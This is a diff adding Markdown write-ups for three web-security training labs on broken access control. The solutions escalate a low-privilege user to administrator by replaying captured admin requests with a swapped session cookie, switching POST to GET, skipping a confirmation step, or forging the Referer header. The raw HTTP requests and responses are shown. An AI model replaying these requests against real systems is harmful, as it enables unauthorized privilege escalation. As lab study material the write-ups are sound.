@@ -440,4 +440,200 @@ X-Original-Url: /admin/delete
 
 and sending it solves the lab.
 
+# Lab 11
+
+## Description
+
+This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.
+
+To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.
+
+## Solution
+
+Log in as `administrator` and observe the `upgrade` and `downgrade` mechanic:
+
+```
+POST /admin-roles HTTP/2
+Host: 0a54005f040b3b9e80ef7137006f00e9.web-security-academy.net
+Cookie: session=ZLeEBSw6Ww2p8E0uOXShhCa4AbixhB1n
+[...]
+
+username=carlos&action=upgrade
+```
+
+send the request to repeater, then log out from the admin panel. 
+
+Log in as `wiener` and try to use the current user cookie in the `upgrade` request:
+
+```
+POST /admin-roles HTTP/2
+[...]
+Cookie: session=VUyxFhjcaXV0nM2XJfYRT4VWLFUpR4bX
+[...]
+
+username=wiener&action=upgrade
+```
+
+which returns:
+
+```
+HTTP/2 401 Unauthorized
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 14
+
+"Unauthorized"
+```
+
+changing the request to a GET request:
+
+```
+GET /admin-roles?username=wiener&action=upgrade HTTP/2
+[...]
+Cookie: session=VUyxFhjcaXV0nM2XJfYRT4VWLFUpR4bX
+[...]
+```
+
+returns:
+
+```
+HTTP/2 302 Found
+Location: /admin
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+```
+
+and solves the lab.
+
+# Lab 12
+
+## Description
+
+This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.
+
+To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.
+
+## Solution
+
+Login as `administrator` and observer the `upgrade` and `downgrade` mechanism. Looking at requests made when upgrading the user `carlos` shows 2 requests:
+
+```
+POST /admin-roles HTTP/2
+[...]
+
+username=carlos&action=upgrade
+```
+
+and
+
+```
+POST /admin-roles HTTP/2
+[...]
+
+action=upgrade&confirmed=true&username=carlos
+```
+
+sending the second one to repeater and changing it between:
+
+```
+POST /admin-roles HTTP/2
+[...]
+
+action=downgrade&confirmed=true&username=carlos
+```
+
+and 
+
+```
+POST /admin-roles HTTP/2
+[...]
+
+action=upgrade&confirmed=true&username=carlos
+```
+
+while checking `carlos` user status reveals the first request is useless to the backend. 
+
+Using the same process as before:
+
+Log out of the `administrator` session and log in to the `wiener` session. Take the new session cookie from `wiener` user and past it into the repeater request:
+
+```
+POST /admin-roles HTTP/2
+Host: 0a7500c70419e0c48028da6f00fb00d0.web-security-academy.net
+Cookie: session=Y8G4zhQIGMZXkBMC4SkERYxShrkDFl9O
+[...]
+
+action=upgrade&confirmed=true&username=wiener
+```
+
+Sending this request solves the lab.
+
+
+# Lab 13
+
+## Description
+
+This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.
+
+To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.
+
+## Solution
+
+Log in as `administrator` and perform an user upgrade on `carlos`. Look the request up:
+
+```
+GET /admin-roles?username=carlos&action=upgrade HTTP/2
+[...]
+Referer: https://0a2a002704eeddc48373ba1f004800c8.web-security-academy.net/admin
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+```
+
+send the request to repeater and change the `referer` value:
+
+```
+GET /admin-roles?username=carlos&action=upgrade HTTP/2
+[...]
+Referer: https://0a2a002704eeddc48373ba1f004800c8.web-security-academy.net/empty
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+```
+
+which returns:
+
+```
+HTTP/2 401 Unauthorized
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 14
+
+"Unauthorized"
+```
+
+which means the server checks authorization based on `referer` value. 
+
+As before, log out of the `administrator` session, log in to the `wiener` session, grep session cookie from the current session and resend the upgrade request as follows:
+
+```
+GET /admin-roles?username=wiener&action=upgrade HTTP/2
+[...]
+Cookie: session=eek0VQO1szKzBnG8ObLtyV3jLhE8KzWX
+[...]
+Referer: https://0a2a002704eeddc48373ba1f004800c8.web-security-academy.net/admin
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+```
+
+which returns:
+
+```
+HTTP/2 302 Found
+Location: /admin
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+```
+
+upgrades user `wiener` to `admin` and solves the lab.
+
 
